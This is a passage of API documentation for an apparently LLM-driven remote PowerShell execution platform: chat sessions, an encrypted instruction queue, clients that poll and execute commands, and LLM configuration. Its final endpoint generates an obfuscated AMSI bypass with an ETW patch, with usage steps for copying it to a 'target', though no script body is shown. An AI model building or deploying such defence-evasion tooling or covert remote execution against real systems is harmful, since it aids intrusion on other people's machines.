  "system_prompt": "You are an expert Windows system administrator...",
  "created_at": "2026-03-04T10:20:00Z"
}
```

#### GET /api/chat/sessions/{session_id}/messages
**Description:** Retrieve all messages in chat session

**Response (200 OK):**
```json
{
  "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
  "messages": [
    {
      "id": "m1",
      "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
      "role": "user",
      "content": "Show me installed web browsers",
      "tool_name": null,
      "tool_args": null,
      "created_at": "2026-03-04T10:20:10Z"
    },
    {
      "id": "m2",
      "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
      "role": "assistant",
      "content": "I'll query the Windows registry for installed browsers...",
      "tool_name": "execute_powershell",
      "tool_args": "{\"powershell_script\": \"Get-ItemProperty...\"}",
      "created_at": "2026-03-04T10:20:11Z"
    },
    {
      "id": "m3",
      "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
      "role": "tool",
      "content": "PowerShell script queued for execution\nInstruction ID: xyz-789",
      "tool_name": "execute_powershell",
      "tool_args": "{\"powershell_script\": \"Get-ItemProperty...\"}",
      "created_at": "2026-03-04T10:20:12Z"
    },
    {
      "id": "m4",
      "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
      "role": "system",
      "content": "⚠️ PowerShell Execution Result - NO OUTPUT",
      "tool_name": null,
      "tool_args": null,
      "created_at": "2026-03-04T10:20:30Z"
    },
    {
      "id": "m5",
      "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
      "role": "system",
      "content": "🤖 Attempt 1/5 - Generating alternative approach...",
      "tool_name": null,
      "tool_args": null,
      "created_at": "2026-03-04T10:20:31Z"
    }
  ]
}
```

#### POST /api/chat/message
**Description:** Send message in chat session (triggers LLM response)

**Request:**
```json
{
  "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
  "message": "What is the current CPU usage?"
}
```

**Response (200 OK):**
```json
{
  "session_id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
  "messages": [
    {
      "id": "m10",
      "role": "user",
      "content": "What is the current CPU usage?",
      "created_at": "2026-03-04T10:25:00Z"
    },
    {
      "id": "m11",
      "role": "assistant",
      "content": "I'll check the CPU usage using Get-Counter...",
      "tool_name": "execute_powershell",
      "tool_args": "{\"powershell_script\": \"Get-Counter...\"}",
      "created_at": "2026-03-04T10:25:01Z"
    },
    {
      "id": "m12",
      "role": "tool",
      "content": "PowerShell script queued for execution\nInstruction ID: abc-456",
      "created_at": "2026-03-04T10:25:02Z"
    }
  ]
}
```

### 5.1.4 Instruction Queue Endpoints

#### GET /api/queue
**Description:** List all instructions in queue

**Query Parameters:**
- `client_id` (optional): Filter by client
- `status` (optional): Filter by status (queued/delivered/completed)

**Response (200 OK):**
```json
[
  {
    "id": "xyz-789",
    "client_id": "WS-DESKTOP-5BG4H0J",
    "status": "queued",
    "created_at": "2026-03-04T10:20:12Z",
    "command_plain": "Get-ItemProperty HKLM:\\SOFTWARE\\...",
    "has_result": false
  },
  {
    "id": "abc-456",
    "client_id": "WS-DESKTOP-5BG4H0J",
    "status": "completed",
    "created_at": "2026-03-04T10:25:02Z",
    "delivered_at": "2026-03-04T10:25:15Z",
    "completed_at": "2026-03-04T10:25:18Z",
    "command_plain": "Get-Counter '\\Processor(_Total)\\% Processor Time'",
    "has_result": true
  }
]
```

#### GET /api/result/{instruction_id}
**Description:** Retrieve instruction execution result

**Response (200 OK):**
```json
{
  "id": "abc-456",
  "client_id": "WS-DESKTOP-5BG4H0J",
  "status": "completed",
  "created_at": "2026-03-04T10:25:02Z",
  "delivered_at": "2026-03-04T10:25:15Z",
  "completed_at": "2026-03-04T10:25:18Z",
  "command_plain": "Get-Counter '\\Processor(_Total)\\% Processor Time'",
  "result_plain_b64": null,
  "plaintext": "Timestamp                 CounterSamples\n---------                 --------------\n3/4/2026 10:25:18 AM      \\\\WS-DESKTOP-5BG4H0J\\processor(_total)\\% processor time : 15.625"
}
```

**Note on Result Decryption:**
- If client is online: `plaintext` field contains decrypted result
- If client is offline: Decryption fails, warning message shown
- `result_plain_b64`: Legacy field (base64-encoded plaintext)

### 5.1.5 MCP Client Communication Endpoints

#### GET /api/clients/{client_id}/pull
**Description:** Client polls for queued instructions (called by MCP client)

**Headers:**
```
X-Client-Auth: <shared_secret>
```

**Response (200 OK):**
```json
[
  {
    "id": "xyz-789",
    "command_encrypted": "<base64-encoded-encrypted-bytes>"
  },
  {
    "id": "def-012",
    "command_encrypted": "<base64-encoded-encrypted-bytes>"
  }
]
```

**Client Actions:**
1. Decode base64 → encrypted bytes
2. Decrypt using AES-256-GCM with client-specific key
3. Execute PowerShell command
4. Encrypt result
5. POST to `/api/clients/{client_id}/result/{instruction_id}`

#### POST /api/clients/{client_id}/result/{instruction_id}
**Description:** Client posts execution result (called by MCP client)

**Headers:**
```
X-Client-Auth: <shared_secret>
Content-Type: application/json
```

**Request:**
```json
{
  "result_encrypted": "<base64-encoded-encrypted-bytes>",
  "status": "completed"
}
```

**Response (200 OK):**
```json
{
  "success": true,
  "instruction_id": "xyz-789"
}
```

### 5.1.6 LLM Configuration Endpoints

#### GET /api/llm/configs
**Description:** List user's LLM configurations

**Response (200 OK):**
```json
{
  "configs": [
    {
      "id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
      "owner_user_id": "d290f1ee-6c54-4b01-90e6-d701748f0851",
      "name": "OpenAI GPT-4 Turbo",
      "provider": "openai",
      "model": "gpt-4-turbo-preview",
      "temperature": 0.7,
      "is_active": true,
      "created_at": "2026-03-01T08:00:00Z"
    },
    {
      "id": "c3bb189e-8bf9-3888-9912-ace4e6543099",
      "owner_user_id": "d290f1ee-6c54-4b01-90e6-d701748f0851",
      "name": "Claude Sonnet 3.5",
      "provider": "anthropic",
      "model": "claude-3-5-sonnet-20241022",
      "temperature": 0.8,
      "is_active": false,
      "created_at": "2026-03-02T14:30:00Z"
    }
  ]
}
```

**Note:** API keys are never returned in responses (stored encrypted)

#### POST /api/llm/configs
**Description:** Create new LLM configuration

**Request:**
```json
{
  "name": "OpenAI GPT-4",
  "provider": "openai",
  "model": "gpt-4",
  "api_key": "sk-proj-...",
  "temperature": 0.7
}
```

**Response (201 Created):**
```json
{
  "id": "new-uuid-here",
  "owner_user_id": "d290f1ee-6c54-4b01-90e6-d701748f0851",
  "name": "OpenAI GPT-4",
  "provider": "openai",
  "model": "gpt-4",
  "temperature": 0.7,
  "is_active": true,
  "created_at": "2026-03-04T10:30:00Z"
}
```

### 5.1.7 Tools Endpoints

#### POST /api/tools/generate
**Description:** Generate predefined security tool script

**Request:**
```json
{
  "tool_name": "amsi_bp",
  "config": {
    "obfuscation_level": "elite",
    "include_etw_patch": true
  }
}
```

**Response (200 OK):**
```json
{
  "tool_name": "AMSI_BP_Elite_v2.3.1",
  "script": "<full-powershell-script>",
  "script_size_bytes": 4567,
  "usage_instructions": "1. Copy script to target\n2. Execute: .\\AMSI_BP_Elite_v2.3.1.ps1\n3. Verify bypass: Test-AmsiScanBuffer"
}
```

---

(Continuing in next part due to length...)
